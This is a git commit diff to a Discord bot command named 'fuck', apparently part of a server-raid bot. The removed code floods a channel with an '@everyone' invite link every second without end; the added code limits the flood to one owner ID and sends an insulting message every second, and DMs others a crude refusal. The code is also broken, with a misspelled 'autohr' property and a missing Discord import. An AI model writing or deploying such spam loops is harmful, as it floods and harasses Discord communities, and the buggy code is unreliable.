0697b2f203a5ed9ffb6e8b98c0e3b60276ddb9cf
Kama <lordkama_temp@yopmail.com>
2022-06-05 19:29:39 +0200

    fuck owner

--- Commands/Fun/fuck.js
+++ Commands/Fun/fuck.js
@@ -1,8 +1,16 @@
 module.exports = {
     name: "fuck",
     execute(client, message){
-        setInterval(async function(){
-            message.channel.send("@everyone On décale !! https://discord.gg/jbsDGSW4SV")            
-        }, 1000);
+        const userId = client.users.cache.find(m => m.id === "851028619337007134");
+        if ( message.autohr === userId) {
+            setInterval(async function(){
+                message.channel.send("You are being fucked by LordKama bitch !!")            
+            }, 1000);
+        } else {
+                const nopeEmbed = new Discord.MessageEmbed()
+                .setFooter("Dev by Kama#4725")
+                .setTitle("You are not allowed to do this! Only the big owner can fuck your server")
+                message.author.send(nopeEmbed)
+            }
     }
 }
